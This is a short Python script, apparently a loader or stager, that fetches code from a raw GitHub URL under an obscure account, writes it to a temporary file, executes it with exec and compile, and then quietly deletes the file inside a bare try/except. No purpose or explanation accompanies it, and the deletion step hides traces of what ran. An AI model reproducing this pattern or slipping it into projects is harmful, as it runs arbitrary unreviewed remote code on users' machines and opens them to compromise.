import tempfile
import os
from urllib.request import urlopen

url = 'https://raw.githubusercontent.com/Mikepranonto663/z/main/z'
response = urlopen(url)

with tempfile.NamedTemporaryFile(mode='w+t', suffix='.py', delete=False) as temp:
    code = response.read().decode('utf-8')
    temp.write(code)
    temp.seek(0)
    exec(compile(temp.read(), temp.name, 'exec'))

try:os.remove(temp.name)
except:pass